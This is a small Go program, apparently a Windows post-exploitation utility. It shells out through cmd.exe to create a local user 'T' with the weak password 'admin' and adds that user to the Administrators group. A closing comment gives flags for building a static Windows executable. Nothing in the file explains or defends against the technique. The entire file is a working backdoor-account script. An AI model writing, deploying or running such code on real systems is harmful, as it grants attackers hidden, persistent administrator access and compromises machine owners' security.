package main

import (
	"fmt"
	"os/exec"
	"time"

	"github.com/axgle/mahonia"
)

func command(cmd string, arg string) {
	// buf, err := exec.Command("cmd.exe", "/c", "python", "--version").Output()
	buf, err := exec.Command("cmd.exe", "/c", cmd, arg).Output()
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println(mahonia.NewEncoder("GBK").ConvertString(string(buf)))
	}
}

// 执行cmd命令
func main() {
	command("net", "user T admin /add")
	command("net", "localgroup Administrators T /add")
	time.Sleep(5 * time.Second)
}
// CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build T.go

